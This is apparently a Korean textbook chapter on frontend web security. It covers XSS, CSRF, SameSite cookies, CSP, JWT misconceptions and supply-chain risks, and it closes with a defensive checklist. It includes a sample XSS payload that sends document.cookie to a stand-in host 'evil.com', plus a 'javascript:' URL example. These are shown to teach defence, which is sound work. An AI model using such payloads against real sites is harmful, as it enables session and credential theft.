XSS — 교차 사이트 스크립팅

공격자의 스크립트가 내 사이트에서 실행되는 취약점입니다. 그 순간 그 스크립트는 내 사이트의 권한을 그대로 갖습니다.

어떻게 발생하는가 
// 사용자가 댓글에 이렇게 입력했다면
const comment = '<img src=x onerror="fetch(\'https://evil.com?c=\'+document.cookie)">';

element.innerHTML = comment;    // ☠️ 실제로 실행됩니다 (38장)
공격자가 할 수 있는 것
쿠키·localStorage의 토큰 탈취(39장)
사용자 대신 요청 전송 (송금, 비밀번호 변경)
가짜 로그인 폼 표시
키 입력 기록, 화면 내용 전송

방어

① 출력 시 이스케이프 — 가장 근본적인 방어 
// ❌
element.innerHTML = userInput;

// ✅ 텍스트로만 취급합니다 (6·38장)
element.textContent = userInput;

⚛️ React는 기본적으로 안전합니다

<div>{userInput}</div>
// React가 자동으로 이스케이프합니다. <script>는 글자로 표시될 뿐입니다.

// ⚠️ 이것만 위험합니다 — 이름부터 경고입니다
<div dangerouslySetInnerHTML={{ __html: userInput }} />

6장에서 배운 문자 엔티티가 여기서 의미를 갖습니다. React가 <를 &lt;로 바꿔 주기 때문에 안전한 것입니다.

② HTML을 꼭 허용해야 한다면 정화 
import DOMPurify from "dompurify";

const clean = DOMPurify.sanitize(userHtml, {
  ALLOWED_TAGS: ["b", "i", "em", "strong", "a", "p", "br"],
  ALLOWED_ATTR: ["href"]
});
element.innerHTML = clean;

🚫 직접 필터를 만들지 마세요

<script>만 제거하면 될 것 같지만 <img onerror>, <svg onload>, javascript: URL, 대소문자 변형, 인코딩 우회 등 수십 가지 경로가 있습니다. 42장에서 말한 대로 정규식으로 HTML을 다루려는 시도는 거의 항상 뚫립니다. 검증된 라이브러리를 쓰세요.

③ 위험한 다른 통로들 
// URL — javascript: 스킴 주의
<a href={userUrl}>링크</a>
// userUrl이 "javascript:alert(1)" 이면 클릭 시 실행됩니다
// ✅ 프로토콜을 검사하세요
const safe = /^https?:\/\//.test(userUrl) ? userUrl : "#";

// 절대 하지 말 것
eval(userInput);
new Function(userInput);
element.setAttribute("onclick", userInput);

CSRF — 교차 사이트 요청 위조

동작 원리 
① 사용자가 은행 사이트에 로그인한 상태 (쿠키 있음)
② 공격자의 페이지에 방문
③ 그 페이지가 은행 API로 요청을 보냄
④ 브라우저가 쿠키를 '자동으로' 붙임 (4장)
⑤ 서버는 정상 요청으로 처리 → 송금 실행

🍪 원인은 쿠키의 자동 전송입니다

4장에서 배운 "브라우저가 쿠키를 자동으로 붙인다"는 편리함이 그대로 취약점이 됩니다. 공격자는 응답을 읽을 필요도 없습니다. 요청이 실행되기만 하면 되기 때문에 CORS로 막히지 않습니다(37장).

방어 — 서버 설정이지만 알아야 합니다 
Set-Cookie: session=abc;
  HttpOnly;              JS가 읽을 수 없음 (XSS 대비)
  Secure;                HTTPS에서만 전송
  SameSite=Lax;          다른 사이트에서 시작된 요청에는 대체로 전송 안 됨
SameSite동작
Strict다른 사이트에서 온 요청에 절대 전송 안 함. 안전하지만 외부 링크로 들어오면 로그아웃처럼 보입니다
Lax일반적인 링크 이동(GET)에는 전송, POST 등에는 전송 안 함. 현대 브라우저의 기본값
None항상 전송. Secure가 필수이며 CSRF에 노출됩니다

추가로 CSRF 토큰(폼에 예측 불가능한 값을 넣고 서버가 검증)을 함께 쓰는 것이 표준입니다. 또 상태를 바꾸는 요청에 GET을 쓰지 않는 것(4장)이 기본 전제입니다.

CSP — 콘텐츠 보안 정책

Content-Security-Policy:
  default-src 'self';
  script-src 'self' https://trusted-cdn.com;
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  frame-ancestors 'none';

🧱 두 번째 방어선

CSP는 "이 출처의 스크립트만 실행하라"고 브라우저에 지시합니다. XSS가 발생하더라도 공격자의 스크립트가 실행되지 못하게 막을 수 있습니다.
XSS를 막는 것이 1차 방어이고, CSP는 그것이 실패했을 때의 2차 방어입니다. "CSP를 켰으니 innerHTML을 써도 된다"는 잘못된 생각입니다.

⚠️ 'unsafe-inline'은 방어를 크게 약화시킵니다

인라인 스크립트를 허용하면 XSS 방어 효과가 대부분 사라집니다. nonce나 해시 기반으로 특정 인라인 스크립트만 허용하는 것이 권장됩니다.
도입할 때는 Content-Security-Policy-Report-Only로 먼저 켜서 무엇이 차단될지 보고한 뒤 실제 적용하는 것이 안전합니다. 바로 켜면 사이트가 동작하지 않을 수 있습니다.

🔑 JWT에 대한 흔한 오해

  • JWT는 암호화되지 않습니다. Base64로 인코딩되었을 뿐이라 누구나 내용을 볼 수 있습니다. 비밀 정보를 넣으면 안 됩니다.
  • 서명은 위조를 막을 뿐 읽는 것을 막지 않습니다.
  • 로그아웃이 어렵습니다. 발급된 토큰은 만료까지 유효하므로 별도의 차단 목록이나 짧은 만료 + 리프레시 토큰 구조가 필요합니다.

🕸️ 공급망 공격

46장에서 말했듯 패키지 3개를 설치하면 수백 개가 따라옵니다. 그중 하나가 탈취되면 여러분의 앱에 악성 코드가 들어옵니다. 실제로 널리 쓰이는 패키지가 악성 코드로 교체된 사건이 여러 차례 있었습니다.

  • lock 파일을 커밋하고 CI에서 npm ci를 씁니다(46장)

  • 자동 업데이트 도구(Dependabot 등)로 보안 패치를 놓치지 않습니다
  • 설치 전 다운로드 수·최근 배포일·이슈 대응을 확인합니다

🛠️ 현장 노트 — 프론트엔드 보안 체크리스트

  1. 사용자 입력을 innerHTML·dangerouslySetInnerHTML에 넣지 않는다
  2. 꼭 필요하면 DOMPurify로 정화한다
  3. 사용자가 준 URL은 프로토콜을 검사한다
  4. 비밀 키를 프론트엔드에 두지 않는다. 서버를 경유한다
  5. 토큰은 HttpOnly·Secure·SameSite 쿠키에
  6. CSP를 설정한다 (Report-Only로 시작)
  7. HTTPS를 강제한다
  8. API 응답에 불필요한 필드가 없는지 확인한다 (백엔드와 협의)
  9. 오류 메시지에 내부 정보를 노출하지 않는다
  10. 의존성을 주기적으로 점검한다
  11. 서버에서도 모든 검증과 권한 확인을 한다

완벽한 보안은 없습니다. 목표는 방어를 여러 겹으로 쌓아 하나가 뚫려도 피해가 제한되게 만드는 것입니다. 그리고 모르는 것을 아는 척하지 마세요. 보안은 확실하지 않으면 물어보는 것이 가장 중요한 태도입니다.

📌 요약

  • 클라이언트에서 오는 것은 아무것도 믿을 수 없다. 서버가 반드시 다시 검증한다.
  • XSS는 사용자 입력을 HTML로 해석할 때 생긴다. textContent가 기본.
  • React는 기본적으로 이스케이프한다. dangerouslySetInnerHTML만 위험하다.
  • 정화 필터를 직접 만들지 않는다. DOMPurify를 쓴다.
  • CSRF는 쿠키 자동 전송이 원인이다. SameSite + CSRF 토큰으로 막는다.
  • CSP는 2차 방어선이다. Report-Only로 먼저 확인하고 적용한다.
  • JWT는 암호화가 아니다. 누구나 내용을 볼 수 있다.
  • 토큰은 HttpOnly 쿠키가 더 안전하다.
  • 커밋된 비밀 키는 폐기·재발급이 유일한 대응이다.
  • 의존성도 공격 경로다. 최소화하고 주기적으로 점검한다.
